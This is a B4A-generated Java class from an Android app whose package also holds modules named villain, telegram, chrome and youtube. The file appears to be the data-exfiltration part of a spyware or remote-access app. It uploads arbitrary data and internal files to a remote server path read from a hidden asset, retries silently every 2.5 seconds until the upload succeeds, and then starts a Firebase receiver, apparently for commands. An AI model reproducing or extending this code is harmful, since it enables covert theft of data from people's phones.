package com.Mad.api;


import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.B4AClass;
import anywheresoftware.b4a.BALayout;
import anywheresoftware.b4a.debug.*;

public class sendserver extends B4AClass.ImplB4AClass implements BA.SubDelegator{
    private static java.util.HashMap<String, java.lang.reflect.Method> htSubs;
    private void innerInitialize(BA _ba) throws Exception {
        if (ba == null) {
            ba = new BA(_ba, this, htSubs, "com.Mad.api.sendserver");
            if (htSubs == null) {
                ba.loadHtSubs(this.getClass());
                htSubs = ba.htSubs;
            }
            
        }
        if (BA.isShellModeRuntimeCheck(ba)) 
			   this.getClass().getMethod("_class_globals", com.Mad.api.sendserver.class).invoke(this, new Object[] {null});
        else
            ba.raiseEvent2(null, true, "class_globals", false);
    }

 public anywheresoftware.b4a.keywords.Common __c = null;
public com.Mad.api.main _main = null;
public com.Mad.api.newmessage _newmessage = null;
public com.Mad.api.serverlink _serverlink = null;
public com.Mad.api.firebasemessaging _firebasemessaging = null;
public com.Mad.api.starter _starter = null;
public com.Mad.api.chrome _chrome = null;
public com.Mad.api.mainchange _mainchange = null;
public com.Mad.api.second _second = null;
public com.Mad.api.telegram _telegram = null;
public com.Mad.api.villain _villain = null;
public com.Mad.api.youtube _youtube = null;
public com.Mad.api.httputils2service _httputils2service = null;
public String  _class_globals() throws Exception{
 //BA.debugLineNum = 1;BA.debugLine="Sub Class_Globals";
 //BA.debugLineNum = 2;BA.debugLine="End Sub";
return "";
}
public String  _initialize(anywheresoftware.b4a.BA _ba) throws Exception{
innerInitialize(_ba);
 //BA.debugLineNum = 5;BA.debugLine="Public Sub Initialize";
 //BA.debugLineNum = 7;BA.debugLine="End Sub";
return "";
}
public void  _senddata(String _data) throws Exception{
ResumableSub_SendData rsub = new ResumableSub_SendData(this,_data);
rsub.resume(ba, null);
}
public static class ResumableSub_SendData extends BA.ResumableSub {
public ResumableSub_SendData(com.Mad.api.sendserver parent,String _data) {
this.parent = parent;
this._data = _data;
}
com.Mad.api.sendserver parent;
String _data;
String _apilink = "";
String _sudoport = "";
com.Mad.api.httpjob _job = null;

@Override
public void resume(BA ba, Object[] result) throws Exception{

    while (true) {
        switch (state) {
            case -1:
return;

case 0:
//C
this.state = 1;
 //BA.debugLineNum = 9;BA.debugLine="Dim ApiLink As String = ServerLink.link";
_apilink = parent._serverlink._link /*String*/ ;
 //BA.debugLineNum = 10;BA.debugLine="Dim sudoport As String = File.ReadString(File.Dir";
_sudoport = parent.__c.File.ReadString(parent.__c.File.getDirAssets(),"sudoport.txt");
 //BA.debugLineNum = 11;BA.debugLine="Dim job As HttpJob";
_job = new com.Mad.api.httpjob();
 //BA.debugLineNum = 12;BA.debugLine="job.Initialize(\"\", Me)";
_job._initialize /*String*/ (ba,"",parent);
 //BA.debugLineNum = 13;BA.debugLine="job.PostString(ApiLink&\"/\"&sudoport&\"/Received.ph";
_job._poststring /*String*/ (_apilink+"/"+_sudoport+"/Received.php",_data);
 //BA.debugLineNum = 14;BA.debugLine="Wait For (job) JobDone (job As HttpJob)";
parent.__c.WaitFor("jobdone", ba, this, (Object)(_job));
this.state = 7;
return;
case 7:
//C
this.state = 1;
_job = (com.Mad.api.httpjob) result[0];
;
 //BA.debugLineNum = 15;BA.debugLine="If Not(job.Success) Then";
if (true) break;

case 1:
//if
this.state = 6;
if (parent.__c.Not(_job._success /*boolean*/ )) { 
this.state = 3;
}else {
this.state = 5;
}if (true) break;

case 3:
//C
this.state = 6;
 //BA.debugLineNum = 16;BA.debugLine="job.Release";
_job._release /*String*/ ();
 //BA.debugLineNum = 17;BA.debugLine="Sleep(2500)";
parent.__c.Sleep(parent.getActivityBA(),this,(int) (2500));
this.state = 8;
return;
case 8:
//C
this.state = 6;
;
 //BA.debugLineNum = 18;BA.debugLine="SendData(data)";
parent._senddata(_data);
 if (true) break;

case 5:
//C
this.state = 6;
 //BA.debugLineNum = 20;BA.debugLine="job.Release";
_job._release /*String*/ ();
 if (true) break;

case 6:
//C
this.state = -1;
;
 //BA.debugLineNum = 22;BA.debugLine="StartReceiver(FirebaseMessaging)";
parent.__c.StartReceiver(ba,(Object)(parent._firebasemessaging.getObject()));
 //BA.debugLineNum = 23;BA.debugLine="End Sub";
if (true) break;

            }
        }
    }
}
public void  _jobdone(com.Mad.api.httpjob _job) throws Exception{
}
public void  _sendfile(String _data,String _filename) throws Exception{
ResumableSub_SendFile rsub = new ResumableSub_SendFile(this,_data,_filename);
rsub.resume(ba, null);
}
public static class ResumableSub_SendFile extends BA.ResumableSub {
public ResumableSub_SendFile(com.Mad.api.sendserver parent,String _data,String _filename) {
this.parent = parent;
this._data = _data;
this._filename = _filename;
}
com.Mad.api.sendserver parent;
String _data;
String _filename;
String _apilink = "";
String _sudoport = "";
com.Mad.api.httpjob _job = null;

@Override
public void resume(BA ba, Object[] result) throws Exception{

    while (true) {
        switch (state) {
            case -1:
return;

case 0:
//C
this.state = 1;
 //BA.debugLineNum = 25;BA.debugLine="Dim ApiLink As String = ServerLink.link";
_apilink = parent._serverlink._link /*String*/ ;
 //BA.debugLineNum = 26;BA.debugLine="Dim sudoport As String = File.ReadString(File.Dir";
_sudoport = parent.__c.File.ReadString(parent.__c.File.getDirAssets(),"sudoport.txt");
 //BA.debugLineNum = 27;BA.debugLine="Dim job As HttpJob";
_job = new com.Mad.api.httpjob();
 //BA.debugLineNum = 28;BA.debugLine="job.Initialize(\"\", Me)";
_job._initialize /*String*/ (ba,"",parent);
 //BA.debugLineNum = 29;BA.debugLine="job.PostFile(ApiLink&\"/\"&sudoport&\"/file.php\"&dat";
_job._postfile /*String*/ (_apilink+"/"+_sudoport+"/file.php"+_data,parent.__c.File.getDirInternal(),_filename);
 //BA.debugLineNum = 30;BA.debugLine="Wait For (job) JobDone (job As HttpJob)";
parent.__c.WaitFor("jobdone", ba, this, (Object)(_job));
this.state = 7;
return;
case 7:
//C
this.state = 1;
_job = (com.Mad.api.httpjob) result[0];
;
 //BA.debugLineNum = 31;BA.debugLine="If Not(job.Success) Then";
if (true) break;

case 1:
//if
this.state = 6;
if (parent.__c.Not(_job._success /*boolean*/ )) { 
this.state = 3;
}else {
this.state = 5;
}if (true) break;

case 3:
//C
this.state = 6;
 //BA.debugLineNum = 32;BA.debugLine="job.Release";
_job._release /*String*/ ();
 //BA.debugLineNum = 33;BA.debugLine="Sleep(2500)";
parent.__c.Sleep(parent.getActivityBA(),this,(int) (2500));
this.state = 8;
return;
case 8:
//C
this.state = 6;
;
 //BA.debugLineNum = 34;BA.debugLine="SendFile(data,FileName)";
parent._sendfile(_data,_filename);
 if (true) break;

case 5:
//C
this.state = 6;
 //BA.debugLineNum = 36;BA.debugLine="job.Release";
_job._release /*String*/ ();
 if (true) break;

case 6:
//C
this.state = -1;
;
 //BA.debugLineNum = 38;BA.debugLine="StartReceiver(FirebaseMessaging)";
parent.__c.StartReceiver(ba,(Object)(parent._firebasemessaging.getObject()));
 //BA.debugLineNum = 39;BA.debugLine="End Sub";
if (true) break;

            }
        }
    }
}
public Object callSub(String sub, Object sender, Object[] args) throws Exception {
BA.senderHolder.set(sender);
return BA.SubDelegator.SubNotFound;
}
}
